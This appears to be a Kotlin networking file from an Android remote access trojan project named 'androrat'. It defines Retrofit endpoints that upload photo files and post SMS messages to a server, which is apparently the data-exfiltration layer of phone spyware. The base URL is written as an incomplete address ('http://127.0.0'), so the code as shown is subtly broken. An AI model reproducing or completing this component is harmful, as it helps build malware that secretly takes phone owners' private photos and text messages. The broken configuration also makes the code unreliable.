package com.ierusalem.androrat.core.data.networking

import android.content.Context
import okhttp3.MultipartBody
import okhttp3.ResponseBody
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.Multipart
import retrofit2.http.POST
import retrofit2.http.Part

interface ApiService {
    @Multipart
    @POST("upload")
    suspend fun uploadPhotos(
        @Part file: MultipartBody.Part
    ): Response<ResponseBody>

    @POST("sms")
    suspend fun postMessages(
        @Body sms: SMSModel
    ): Response<ResponseBody>
}

class RetrofitInstance(context: Context) {
    
    private val BASE_URL = "http://127.0.0"

    private val retrofit by lazy {
        Retrofit.Builder()
            .baseUrl(BASE_URL)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
    }

    val api: ApiService by lazy {
        retrofit.create(ApiService::class.java)
    }
}
